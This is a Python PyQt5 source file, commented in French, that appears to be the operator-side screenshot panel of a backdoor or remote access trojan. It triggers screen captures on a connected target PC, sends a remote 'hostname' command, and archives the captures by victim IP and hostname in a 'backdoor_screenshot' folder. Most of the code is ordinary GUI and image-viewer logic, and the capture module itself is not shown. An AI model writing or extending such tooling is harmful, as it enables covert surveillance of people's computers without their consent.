from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QPushButton, QLabel, 
                             QScrollArea, QGridLayout, QHBoxLayout, 
                             QFrame, QSizePolicy, QDialog)
from PyQt5.QtCore import Qt, QSize
from PyQt5.QtGui import QPixmap, QFont
from core.screenshot_handler import ScreenshotHandler
import os
import datetime

class ScreenshotTab(QWidget):
    def __init__(self, connection_tab):
        super().__init__()
        self.connection_tab = connection_tab
        self.screenshot_items = []  # Pour stocker les références aux widgets
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(10, 10, 10, 10)
        
        # Contrôles supérieurs
        controls_layout = QHBoxLayout()
        
        self.status_label = QLabel("Cliquez sur le bouton pour capturer l'écran.")
        self.status_label.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        
        self.capture_button = QPushButton("Capturer l'écran")
        self.capture_button.clicked.connect(self.capture_screenshot)
        
        self.refresh_button = QPushButton("Rafraîchir les captures")
        self.refresh_button.clicked.connect(self.refresh_screenshots)
        
        controls_layout.addWidget(self.status_label)
        controls_layout.addWidget(self.capture_button)
        controls_layout.addWidget(self.refresh_button)
        
        layout.addLayout(controls_layout)
        
        # Zone de défilement pour les screenshots
        self.scroll_area = QScrollArea()
        self.scroll_area.setWidgetResizable(True)
        self.scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)  # Désactiver la scrollbar horizontale
        
        self.screenshots_container = QWidget()
        self.screenshots_layout = QGridLayout(self.screenshots_container)
        self.screenshots_layout.setContentsMargins(5, 5, 5, 5)
        
        self.scroll_area.setWidget(self.screenshots_container)
        layout.addWidget(self.scroll_area)
        
        self.setLayout(layout)

    def capture_screenshot(self):
        if not self.connection_tab.client_handler:
            self.status_label.setText("[!] Pas de connexion active.")
            return

        handler = ScreenshotHandler(self.connection_tab.client_handler)
        result = handler.capture()
        self.status_label.setText(result)
        
        # Rafraîchir la liste des screenshots après en avoir capturé un nouveau
        self.refresh_screenshots()

    def refresh_screenshots(self):
        if not self.connection_tab.client_handler:
            self.status_label.setText("[!] Pas de connexion active.")
            return
            
        # Vider la liste des références
        self.screenshot_items = []
        
        # Effacer la disposition existante
        self._clear_layout()

        try:
            # Récupérer le hostname du client actuellement connecté
            hostname = self._get_connected_hostname()
            
            if not hostname:
                self.status_label.setText("[!] Impossible de déterminer le nom du PC cible.")
                return
                
            # Chemin vers le dossier des screenshots pour ce PC
            screenshots_dir = os.path.join(os.getenv('APPDATA'), "backdoor_screenshot", hostname)
            
            if not os.path.exists(screenshots_dir):
                self.status_label.setText(f"Aucune capture d'écran trouvée pour {hostname}")
                return
                
            # Lister tous les fichiers screenshots
            screenshots = [f for f in os.listdir(screenshots_dir) if f.endswith('.png')]
            
            if not screenshots:
                self.status_label.setText(f"Aucune capture d'écran trouvée pour {hostname}")
                return
                
            # Trier les screenshots par date (plus récent en premier)
            screenshots.sort(reverse=True, key=lambda x: os.path.getmtime(os.path.join(screenshots_dir, x)))
            
            # Créer les éléments
            for screenshot in screenshots:
                screenshot_path = os.path.join(screenshots_dir, screenshot)
                item = self._create_screenshot_item(screenshot_path, screenshot)
                self.screenshot_items.append(item)
            
            # Organiser les éléments en grille
            self._arrange_items()
                    
            self.status_label.setText(f"{len(screenshots)} capture(s) d'écran trouvée(s) pour {hostname}")
            
        except Exception as e:
            self.status_label.setText(f"[!] Erreur lors du chargement des captures: {str(e)}")

    def _clear_layout(self):
        """Efface tous les widgets du layout"""
        while self.screenshots_layout.count():
            item = self.screenshots_layout.takeAt(0)
            widget = item.widget()
            if widget is not None:
                widget.deleteLater()

    def _create_screenshot_item(self, image_path, image_name):
        """Crée un widget pour une capture d'écran avec ses informations"""
        # Créer un cadre pour contenir l'image et les informations
        frame = QFrame()
        frame.setFrameShape(QFrame.Box)
        frame.setFrameShadow(QFrame.Raised)
        frame.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        
        container_layout = QVBoxLayout(frame)
        
        # Créer un QLabel pour l'image
        image_label = QLabel()
        image_label.setAlignment(Qt.AlignCenter)
        
        # Charger et redimensionner l'image
        pixmap = QPixmap(image_path)
        
        # On sauvegarde le pixmap original pour pouvoir ajuster la taille plus tard
        image_label.setProperty("original_pixmap", pixmap)
        image_label.setProperty("image_path", image_path)
        
        # Taille initiale
        scaled_pixmap = pixmap.scaled(QSize(250, 180), Qt.KeepAspectRatio, Qt.SmoothTransformation)
        image_label.setPixmap(scaled_pixmap)
        image_label.setMinimumSize(250, 180)
        image_label.setMaximumSize(400, 300)
        
        # Activer le suivi de la souris pour l'image pour pouvoir détecter les clics
        image_label.setMouseTracking(True)
        image_label.mousePressEvent = lambda event: self.open_image_viewer(image_path)
        
        # Extraire les informations du nom de fichier
        # Format attendu: IP_HOSTNAME_YYYYMMDD-HHMMSS-mss.png
        try:
            parts = image_name.split('_')
            ip = parts[0]
            hostname = parts[1]
            
            # Extraire la date et l'heure
            timestamp_part = parts[2].split('.')[0]  # Enlever l'extension .png
            date_str, time_str = timestamp_part.split('-', 1)
            
            # Formater la date et l'heure
            try:
                year = date_str[:4]
                month = date_str[4:6]
                day = date_str[6:8]
                hour = time_str[:2]
                minute = time_str[2:4]
                second = time_str[4:6]
                
                formatted_date = f"{day}/{month}/{year} {hour}:{minute}:{second}"
            except:
                # Fallback si le format n'est pas celui attendu
                formatted_date = timestamp_part
                
            # Création du panneau d'information
            info_frame = QFrame()
            info_layout = QVBoxLayout(info_frame)
            info_layout.setSpacing(2)
            info_layout.setContentsMargins(5, 5, 5, 5)
            
            # Labels pour les informations
            ip_label = QLabel(f"IP: {ip}")
            
            hostname_label = QLabel(f"Nom: {hostname}")
            
            date_label = QLabel(f"Date: {formatted_date}")
            
            # Ajouter les informations au panneau
            info_layout.addWidget(ip_label)
            info_layout.addWidget(hostname_label)
            info_layout.addWidget(date_label)
            
        except Exception as e:
            # Si erreur dans le parsing du nom de fichier, afficher le nom simplement
            info_frame = QFrame()
            info_layout = QVBoxLayout(info_frame)
            
            name_label = QLabel(image_name)
            name_label.setWordWrap(True)
            info_layout.addWidget(name_label)
        
        # Ajouter l'image et les informations au container
        container_layout.addWidget(image_label)
        container_layout.addWidget(info_frame)
        
        return frame
    
    def open_image_viewer(self, image_path):
        """Ouvre la visionneuse d'image pour l'image sélectionnée"""
        viewer = ImageViewer(image_path, self)
        viewer.exec_()

    def _arrange_items(self):
        """Arrange les éléments dans la grille en fonction de la largeur disponible"""
        if not self.screenshot_items:
            return
            
        # Déterminer le nombre de colonnes en fonction de la largeur
        width = self.scroll_area.viewport().width() - 40  # Tenir compte des marges
        
        # Taille approximative d'un élément + espacement
        item_width = 300  # 250px pour l'image + marges
        
        # Calculer le nombre de colonnes qui tiennent dans la largeur disponible
        num_cols = max(1, width // item_width)
        
        # Placer les éléments dans la grille
        row, col = 0, 0
        for item in self.screenshot_items:
            self.screenshots_layout.addWidget(item, row, col)
            
            col += 1
            if col >= num_cols:
                col = 0
                row += 1
        
        # S'assurer que toutes les colonnes ont le même poids
        for i in range(num_cols):
            self.screenshots_layout.setColumnStretch(i, 1)

    def _get_connected_hostname(self):
        """Récupère le nom d'hôte du PC cible connecté"""
        try:
            # Méthode 1: Essayer de l'extraire du client_handler
            if hasattr(self.connection_tab.client_handler, 'hostname'):
                return self.connection_tab.client_handler.hostname
                
            # Méthode 2: Envoyer une commande pour récupérer le hostname
            result = self.connection_tab.client_handler.send_command("hostname")
            if result and not result.startswith("[!]"):
                return result.strip()
                
            # Méthode 3: Si on a l'adresse IP, chercher dans les dossiers existants
            appdata_path = os.path.join(os.getenv('APPDATA'), "backdoor_screenshot")
            if os.path.exists(appdata_path):
                for folder in os.listdir(appdata_path):
                    folder_path = os.path.join(appdata_path, folder)
                    if os.path.isdir(folder_path):
                        for file in os.listdir(folder_path):
                            if file.startswith(self.connection_tab.client_handler.ip + "_"):
                                return folder
            
            # Si tout échoue, utiliser l'IP comme nom de dossier temporaire
            return self.connection_tab.client_handler.ip
            
        except Exception:
            return None
            
    def resizeEvent(self, event):
        """Réorganise les éléments lorsque la fenêtre est redimensionnée"""
        super().resizeEvent(event)
        # Délai court pour permettre à la zone de défilement de mettre à jour sa taille
        from PyQt5.QtCore import QTimer
        QTimer.singleShot(50, self._arrange_items)

class ImageViewer(QDialog):
    def __init__(self, image_path, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Visionneuse de captures d'écran")
        self.setGeometry(100, 100, 800, 600)
        
        # Créer le layout principal
        layout = QVBoxLayout()
        self.setLayout(layout)
        
        # Variables pour le déplacement de l'image
        self.panning = False
        self.last_pos = None
        
        # Créer un widget QLabel pour contenir l'image
        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setMouseTracking(True)
        
        # Installer les filtres d'événements pour capturer les événements souris
        self.image_label.installEventFilter(self)
        
        # Créer un widget central pour contenir le label d'image
        self.central_widget = QWidget()
        central_layout = QVBoxLayout(self.central_widget)
        central_layout.addWidget(self.image_label)
        central_layout.setContentsMargins(0, 0, 0, 0)
        
        # Créer la zone de défilement pour l'image
        self.scroll_area = QScrollArea()
        self.scroll_area.setWidgetResizable(True)
        self.scroll_area.setWidget(self.central_widget)
        
        # Désactiver les barres de défilement
        self.scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        
        # Charger l'image
        self.pixmap = QPixmap(image_path)
        self.original_pixmap = self.pixmap
        
        # Ajouter le défilement à la disposition
        layout.addWidget(self.scroll_area)
        
        # Ajouter les contrôles de zoom
        controls_layout = QHBoxLayout()
        
        zoom_in_btn = QPushButton("Zoom +")
        zoom_in_btn.clicked.connect(self.zoom_in)
        
        zoom_out_btn = QPushButton("Zoom -")
        zoom_out_btn.clicked.connect(self.zoom_out)
        
        reset_btn = QPushButton("Réinitialiser")
        reset_btn.clicked.connect(self.reset_zoom)
        
        fit_btn = QPushButton("Ajuster")
        fit_btn.clicked.connect(self.fit_to_window)
        
        self.zoom_level = 1.0
        self.zoom_info = QLabel(f"Zoom: 100%")
        
        controls_layout.addWidget(zoom_in_btn)
        controls_layout.addWidget(zoom_out_btn)
        controls_layout.addWidget(reset_btn)
        controls_layout.addWidget(fit_btn)
        controls_layout.addWidget(self.zoom_info)
        
        layout.addLayout(controls_layout)
                
        # Ajuster l'image à la fenêtre lors de l'ouverture
        self.fit_to_window()
    
    def showEvent(self, event):
        """Appelé lorsque la fenêtre est affichée"""
        super().showEvent(event)
        # Ajuster l'image à la fenêtre lors de l'ouverture
        self.fit_to_window()
    
    def resizeEvent(self, event):
        """Ajuster l'image quand la fenêtre est redimensionnée"""
        super().resizeEvent(event)
        # Si l'ajustement automatique est activé, réajuster l'image
        if hasattr(self, 'fit_mode') and self.fit_mode:
            self.fit_to_window()
    
    def zoom_in(self):
        self.fit_mode = False
        self.zoom_level *= 1.25
        self.update_zoom()
    
    def zoom_out(self):
        self.fit_mode = False
        self.zoom_level *= 0.8
        self.update_zoom()
    
    def reset_zoom(self):
        self.fit_mode = False
        self.zoom_level = 1.0
        self.update_zoom()
    
    def fit_to_window(self):
        """Ajuste l'image à la taille de la fenêtre"""
        self.fit_mode = True
        
        # Calculer les dimensions disponibles
        viewport_width = self.scroll_area.viewport().width()
        viewport_height = self.scroll_area.viewport().height()
        
        # Calculer le ratio pour ajuster l'image dans la fenêtre
        img_width = self.original_pixmap.width()
        img_height = self.original_pixmap.height()
        
        width_ratio = viewport_width / img_width
        height_ratio = viewport_height / img_height
        
        # Utiliser le plus petit ratio pour s'assurer que l'image tient entièrement
        self.zoom_level = min(width_ratio, height_ratio) * 0.95  # Marge de 5%
        
        self.update_zoom()
        self.zoom_info.setText(f"Zoom: {int(self.zoom_level * 100)}%")
    
    def update_zoom(self):
        """Met à jour l'affichage avec le niveau de zoom actuel"""
        # Mettre à jour l'affichage du niveau de zoom
        self.zoom_info.setText(f"Zoom: {int(self.zoom_level * 100)}%")
        
        # Calculer la nouvelle taille
        new_width = int(self.original_pixmap.width() * self.zoom_level)
        new_height = int(self.original_pixmap.height() * self.zoom_level)
        
        # Mettre à jour l'image
        scaled_pixmap = self.original_pixmap.scaled(new_width, new_height, 
                                                   Qt.KeepAspectRatio, 
                                                   Qt.SmoothTransformation)
        self.image_label.setPixmap(scaled_pixmap)
        
        # Ajuster la taille du label
        self.image_label.resize(new_width, new_height)

    def wheelEvent(self, event):
        """Gérer le zoom avec la molette de la souris"""
        self.fit_mode = False
        delta = event.angleDelta().y()
        
        # Calculer le facteur de zoom en fonction de la vitesse de rotation
        zoom_factor = 1.1 if delta > 0 else 0.9
        
        # Appliquer le zoom
        self.zoom_level *= zoom_factor
        self.update_zoom()
    
    def eventFilter(self, source, event):
        """Filtre d'événements pour gérer le déplacement de l'image"""
        if source == self.image_label:
            # Démarrer le déplacement lors d'un clic droit
            if event.type() == event.MouseButtonPress and event.button() == Qt.RightButton:
                self.panning = True
                self.last_pos = event.pos()
                self.setCursor(Qt.ClosedHandCursor)
                return True
                
            # Arrêter le déplacement lors du relâchement du bouton
            elif event.type() == event.MouseButtonRelease and event.button() == Qt.RightButton:
                self.panning = False
                self.setCursor(Qt.ArrowCursor)
                return True
                
            # Effectuer le déplacement lors du mouvement de la souris
            elif event.type() == event.MouseMove and self.panning:
                delta = event.pos() - self.last_pos
                
                # Calculer la nouvelle position de l'image
                current_pos = self.central_widget.pos()
                new_x = current_pos.x() + delta.x()
                new_y = current_pos.y() + delta.y()
                
                # Déplacer l'image
                self.central_widget.move(new_x, new_y)
                self.last_pos = event.pos()
                return True
                
        return super().eventFilter(source, event)